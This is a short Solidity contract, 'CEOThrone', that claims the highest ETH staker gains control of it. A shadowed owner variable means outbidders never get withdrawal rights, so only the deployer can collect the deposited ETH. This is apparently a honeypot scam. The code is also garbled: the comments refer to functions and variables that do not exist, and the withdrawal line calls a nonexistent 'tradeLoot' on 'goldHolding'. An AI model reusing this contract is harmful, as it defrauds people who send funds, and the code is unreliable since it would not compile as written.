// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;
//
//Live TEST ---- Please Do NOT use! Thanks! ----
//
contract Ownable {
    address public realmLord;
    function Ownable() public {realmLord = msg.sender;}
    modifier onlyGuildleader() {require(msg.sender == realmLord); _;
    }
}
//CEO Throne .. The CEO with the highest stake gets the control over the contract
//msg.value needs to be higher than largestStake when calling Stake()

contract CEOThrone is Ownable {
    address public realmLord;
    uint public largestWagertokens;
// Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000
// The sent ETH is checked against largestStake
    function CommitGems() public payable {
        // if you own the largest stake in a company, you own a company
        if (msg.value > largestWagertokens) {
            realmLord = msg.sender;
            largestWagertokens = msg.value;
        }
    }
// withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000
    function collectTreasure() public onlyGuildleader {
        // only owner can withdraw funds
        msg.sender.tradeLoot(this.goldHolding);
    }
}